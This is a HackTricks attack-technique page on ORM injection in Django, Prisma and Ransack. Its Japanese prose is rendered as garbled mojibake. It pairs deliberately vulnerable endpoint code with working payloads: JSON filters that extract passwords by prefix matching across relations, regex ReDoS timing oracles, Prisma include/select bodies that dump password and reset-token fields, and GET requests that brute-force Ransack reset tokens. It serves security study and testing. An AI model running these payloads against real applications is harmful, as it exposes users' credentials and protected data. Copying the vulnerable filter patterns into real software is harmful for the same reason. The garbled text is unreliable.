# ORM Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Django ORM (Python)

[**ã“ã®æŠ•ç¨¿**](https://www.elttam.com/blog/plormbing-your-django-orm/)ã§ã¯ã€ä¾‹ãˆã°æ¬¡ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§Django ORMã‚’è„†å¼±ã«ã™ã‚‹æ–¹æ³•ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒè¨˜äº‹ã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹
åŸºæœ¬çš„ãªAPIãƒ“ãƒ¥ãƒ¼
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

ã™ã¹ã¦ã®request.dataï¼ˆã“ã‚Œã¯jsonã«ãªã‚Šã¾ã™ï¼‰ãŒ**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã™ã‚‹ãŸã‚ã«ç›´æ¥æ¸¡ã•ã‚Œã‚‹**ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚æ”»æ’ƒè€…ã¯äºˆæœŸã—ãªã„ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€äºˆæƒ³ä»¥ä¸Šã®ãƒ‡ãƒ¼ã‚¿ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä¾‹:

* **ãƒ­ã‚°ã‚¤ãƒ³:** ç°¡å˜ãªãƒ­ã‚°ã‚¤ãƒ³ã§ã€ç™»éŒ²ã•ã‚Œã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¼æ´©ã•ã›ã‚ˆã†ã¨ã—ã¾ã™ã€‚
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã¦æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
{% endhint %}

* **ãƒªãƒ¬ãƒ¼ã‚·ãƒ§ãƒŠãƒ«ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°**: æ“ä½œã«ä½¿ç”¨ã•ã‚Œã‚‹ã“ã¨ã™ã‚‰äºˆæƒ³ã•ã‚Œã¦ã„ãªã‹ã£ãŸåˆ—ã‹ã‚‰æƒ…å ±ã‚’æ¼æ´©ã•ã›ã‚‹ãŸã‚ã«ã€ãƒªãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ¨ªæ–­ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ä¾‹ãˆã°ã€æ¬¡ã®ãƒªãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦ä½œæˆã•ã‚ŒãŸè¨˜äº‹ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã‚ã‚Œã°: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
ã™ã¹ã¦ã®è¨˜äº‹ã‚’ä½œæˆã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™
{% endhint %}

* **å¤šå¯¾å¤šã®ãƒªãƒ¬ãƒ¼ã‚·ãƒ§ãƒŠãƒ«ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°**: å‰ã®ä¾‹ã§ã¯ã€è¨˜äº‹ã‚’ä½œæˆã—ã¦ã„ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“ã§ã—ãŸã€‚ã—ã‹ã—ã€ä»–ã®ãƒªãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚·ãƒƒãƒ—ã‚’è¿½ã†ã“ã¨ã§ã“ã‚Œã¯å¯èƒ½ã§ã™ã€‚ä¾‹ãˆã°: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
ã“ã®å ´åˆã€è¨˜äº‹ã‚’ä½œæˆã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®éƒ¨é–€ã«ã„ã‚‹ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¦‹ã¤ã‘ã€ãã®å¾Œã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆå‰ã®jsonã§ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’æ¼æ´©ã•ã›ã¦ã„ã‚‹ã ã‘ã§ã™ãŒã€ãã®å¾Œã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼‰ã€‚
{% endhint %}

* **Djangoã®ã‚°ãƒ«ãƒ¼ãƒ—ã¨æ¨©é™ã®å¤šå¯¾å¤šé–¢ä¿‚ã‚’ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨æ‚ªç”¨ã™ã‚‹**: ã•ã‚‰ã«ã€AbstractUserãƒ¢ãƒ‡ãƒ«ã¯Djangoã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã“ã®ãƒ¢ãƒ‡ãƒ«ã«ã¯**PermissionãŠã‚ˆã³Groupãƒ†ãƒ¼ãƒ–ãƒ«ã¨ã®å¤šå¯¾å¤šé–¢ä¿‚**ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯åŸºæœ¬çš„ã«ã€**åŒã˜ã‚°ãƒ«ãƒ¼ãƒ—ã«ã„ã‚‹ã‹ã€åŒã˜æ¨©é™ã‚’å…±æœ‰ã—ã¦ã„ã‚‹å ´åˆã«ã€1äººã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®æ–¹æ³•**ã§ã™ã€‚
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼åˆ¶é™ã®ãƒã‚¤ãƒ‘ã‚¹**: åŒã˜ãƒ–ãƒ­ã‚°æŠ•ç¨¿ã§ã¯ã€`articles = Article.objects.filter(is_secret=False, **request.data)`ã®ã‚ˆã†ãªãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã®ä½¿ç”¨ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒææ¡ˆã•ã‚Œã¾ã—ãŸã€‚is\_secret=Trueã®ã‚¢ãƒ¼ãƒ†ã‚£ã‚¯ãƒ«ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ãªãœãªã‚‰ã€ãƒªãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚·ãƒƒãƒ—ã‹ã‚‰Articleãƒ†ãƒ¼ãƒ–ãƒ«ã«æˆ»ã‚‹ã“ã¨ãŒã§ãã€éç§˜å¯†ã®è¨˜äº‹ã‹ã‚‰ç§˜å¯†ã®è¨˜äº‹ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‰ã§ã™ã€‚çµæœã¯çµåˆã•ã‚Œã€is\_secretãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã¯éç§˜å¯†ã®è¨˜äº‹ã§ãƒã‚§ãƒƒã‚¯ã•ã‚Œã‚‹ä¸€æ–¹ã§ã€ãƒ‡ãƒ¼ã‚¿ã¯ç§˜å¯†ã®è¨˜äº‹ã‹ã‚‰æ¼æ´©ã—ã¾ã™ã€‚
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
é–¢ä¿‚ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€è¡¨ç¤ºã•ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿ã‚’ä¿è­·ã™ã‚‹ãŸã‚ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
{% endhint %}

* **ã‚¨ãƒ©ãƒ¼/æ™‚é–“ãƒ™ãƒ¼ã‚¹ã®ReDoS**: å‰ã®ä¾‹ã§ã¯ã€ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ãŒæ©Ÿèƒ½ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã«ã‚ˆã£ã¦ç•°ãªã‚‹å¿œç­”ãŒå¾—ã‚‰ã‚Œã‚‹ã“ã¨ãŒæœŸå¾…ã•ã‚Œã¦ã„ã¾ã—ãŸãŒã€ãã‚Œã‚’ã‚ªãƒ©ã‚¯ãƒ«ã¨ã—ã¦ä½¿ç”¨ã™ã‚‹ãŸã‚ã§ã™ã€‚ã—ã‹ã—ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã§ä½•ã‚‰ã‹ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒè¡Œã‚ã‚Œã€å¿œç­”ãŒå¸¸ã«åŒã˜ã§ã‚ã‚‹å¯èƒ½æ€§ã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¨ãƒ©ãƒ¼ã‚’ç™ºç”Ÿã•ã›ã¦æ–°ã—ã„ã‚ªãƒ©ã‚¯ãƒ«ã‚’å¾—ã‚‹ã“ã¨ãŒå¯èƒ½ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
* **SQLite**: ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯regexpã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ãŒã‚ã‚Šã¾ã›ã‚“ï¼ˆã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã®æ‹¡å¼µæ©Ÿèƒ½ã‚’èª­ã¿è¾¼ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰
* **PostgreSQL**: ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®regexã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆãŒãªãã€ãƒãƒƒã‚¯ãƒˆãƒ©ãƒƒã‚­ãƒ³ã‚°ã«å¯¾ã—ã¦ã‚ˆã‚Šè€æ€§ãŒã‚ã‚Šã¾ã™
* **MariaDB**: regexã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆãŒã‚ã‚Šã¾ã›ã‚“

## Prisma ORM (NodeJS)

ä»¥ä¸‹ã¯[**ã“ã®æŠ•ç¨¿ã‹ã‚‰æŠ½å‡ºã•ã‚ŒãŸãƒˆãƒªãƒƒã‚¯**](https://www.elttam.com/blog/plorming-your-primsa-orm/)ã§ã™ã€‚

* **å®Œå…¨ãªæ¤œç´¢åˆ¶å¾¡**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// Attacker has full control of all prisma options
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

å…¨ã¦ã®JavaScriptãƒœãƒ‡ã‚£ãŒprismaã«æ¸¡ã•ã‚Œã¦ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

å…ƒã®æŠ•ç¨¿ã®ä¾‹ã§ã¯ã€ã“ã‚Œã¯èª°ã‹ã«ã‚ˆã£ã¦ä½œæˆã•ã‚ŒãŸã™ã¹ã¦ã®æŠ•ç¨¿ã‚’ãƒã‚§ãƒƒã‚¯ã—ï¼ˆå„æŠ•ç¨¿ã¯èª°ã‹ã«ã‚ˆã£ã¦ä½œæˆã•ã‚Œã¾ã™ï¼‰ã€ãã®èª°ã‹ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼åã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãªã©ï¼‰ã‚‚è¿”ã—ã¾ã™ã€‚
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
ä»¥ä¸‹ã¯ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŒã¤èª°ã‹ã«ã‚ˆã£ã¦ä½œæˆã•ã‚ŒãŸã™ã¹ã¦ã®æŠ•ç¨¿ã‚’é¸æŠã—ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è¿”ã—ã¾ã™ï¼š
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **å®Œå…¨ãª where å¥ã®åˆ¶å¾¡**:

æ”»æ’ƒè€…ãŒ `where` å¥ã‚’åˆ¶å¾¡ã§ãã‚‹çŠ¶æ³ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // ORMã®æ¼æ´©ã«å¯¾ã—ã¦è„†å¼±
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ç›´æ¥ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
`startsWith`ã®ã‚ˆã†ãªæ“ä½œã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æƒ…å ±ãŒæ¼æ´©ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚&#x20;
{% endhint %}

* **å¤šå¯¾å¤šã®ãƒªãƒ¬ãƒ¼ã‚·ãƒ§ãƒŠãƒ«ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã«ã‚ˆã‚‹ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã®ãƒã‚¤ãƒ‘ã‚¹:**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
`Category` -\[\*..\*]-> `Article` ã®å¤šå¯¾å¤šã®é–¢ä¿‚ã‚’åˆ©ç”¨ã—ã¦ã€æœªå…¬é–‹ã®è¨˜äº‹ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã‚ã‚Šã€ã„ãã¤ã‹ã®ãƒ«ãƒ¼ãƒ—ãƒãƒƒã‚¯å¤šå¯¾å¤šé–¢ä¿‚ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **ã‚¨ãƒ©ãƒ¼/ã‚¿ã‚¤ãƒ ã‚¯ã‚¨ãƒª**: å…ƒã®æŠ•ç¨¿ã§ã¯ã€ã‚¿ã‚¤ãƒ ãƒ™ãƒ¼ã‚¹ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦æƒ…å ±ã‚’æ¼æ´©ã•ã›ã‚‹ãŸã‚ã®æœ€é©ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«å®Ÿæ–½ã•ã‚ŒãŸéå¸¸ã«åºƒç¯„ãªãƒ†ã‚¹ãƒˆã‚»ãƒƒãƒˆã‚’èª­ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
Where the `{CONTAINS_LIST}` ã¯ã€**æ­£ã—ã„æ¼æ´©ãŒè¦‹ã¤ã‹ã£ãŸã¨ãã«å¿œç­”ãŒé…å»¶ã™ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã®1000ã®æ–‡å­—åˆ—ã®ãƒªã‚¹ãƒˆã§ã™ã€‚**

## **Ransack (Ruby)**

ã“ã‚Œã‚‰ã®ãƒˆãƒªãƒƒã‚¯ã¯[**ã“ã®æŠ•ç¨¿ã§è¦‹ã¤ã‹ã‚Šã¾ã—ãŸ**](https://positive.security/blog/ransack-data-exfiltration)**ã€‚**

{% hint style="success" %}
**Ransack 4.0.0.0ã§ã¯ã€æ¤œç´¢å¯èƒ½ãªå±æ€§ã¨é–¢é€£ä»˜ã‘ã®ãŸã‚ã«æ˜ç¤ºçš„ãªè¨±å¯ãƒªã‚¹ãƒˆã®ä½¿ç”¨ãŒå¼·åˆ¶ã•ã‚Œã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**
{% endhint %}

**è„†å¼±ãªä¾‹:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€ã‚¯ã‚¨ãƒªã¯æ”»æ’ƒè€…ã«ã‚ˆã£ã¦é€ä¿¡ã•ã‚ŒãŸãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«ã‚ˆã£ã¦å®šç¾©ã•ã‚Œã¾ã™ã€‚ä¾‹ãˆã°ã€ãƒªã‚»ãƒƒãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã—ãŸï¼š
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã¨æ½œåœ¨çš„ãªé–¢ä¿‚ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ã‚ˆã‚Šå¤šãã®ãƒ‡ãƒ¼ã‚¿ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã—ãŸã€‚

## å‚è€ƒæ–‡çŒ®

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
